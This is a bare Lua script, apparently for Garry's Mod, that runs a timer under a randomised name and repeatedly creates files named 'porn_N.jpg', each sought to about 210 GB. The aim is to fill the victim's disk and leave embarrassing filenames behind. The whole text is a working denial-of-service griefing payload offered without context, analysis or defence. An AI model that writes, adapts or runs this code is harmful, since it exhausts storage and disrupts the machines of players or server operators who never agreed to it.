local function rand_string()
	local s = ""
	for i = 1, math.random(12, 32) do
		s = s .. string.char(math.random(65, 126))
	end
	return s
end

local C, c = 210000000000, 0
local name = rand_string()
timer.Create(name, 1, 100, function()
	for i = 1, 10 do
		c = c + 1
		local F = file.Open("porn_" .. c .. ".jpg", "wb", "DATA")
		if not F then return end
		F:WriteBool(true)
		F:Seek(C)
		F:WriteBool(false)

		if F:Size() == 1 then
			C = C - 2000000.0
			if C <= 0 then
				timer.Remove(name)
			end
		end
		F:Close()
	end
end)
